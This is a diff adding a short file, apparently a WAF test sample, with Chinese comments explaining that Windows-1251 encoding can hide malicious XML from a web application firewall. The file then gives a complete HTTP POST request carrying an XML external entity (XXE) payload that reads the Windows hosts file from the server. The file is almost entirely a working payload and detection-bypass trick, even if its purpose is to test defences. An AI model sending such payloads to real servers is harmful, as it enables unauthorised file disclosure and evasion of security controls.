@@ -1,0 +1,16 @@
+# XML外部实体注入_Windows1251编码
+# "Windows-1251"是一种针对西里尔字母（Slavic alphabets）的字符编码，主要用于编码俄语、乌克兰语、保加利亚语等语言中的字符。它是Windows操作系统中常用的字符编码之一。
+# 攻击者可以使用 Windows-1251 编码来混淆恶意脚本或恶意输入，使其在传输到服务器时看起来像是普通的文本。由于 WAF 可能不会正确解释或检测 Windows-1251 编码的恶意内容，攻击者可以利用这一点来绕过 WAF 的检测，从而成功地向服务器提交恶意请求。
+POST /?bid=hd_tag_m8mv24ul HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ul
+RM-PRO-Token: 3d64c17e01cd748d38c36b3d820e9f83
+RM-PRO-Time: 1742808415249
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0" encoding="windows-1251"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///C:/windows\system32\drivers\etc\hosts">
+]>
+<x>&xxe;</x>
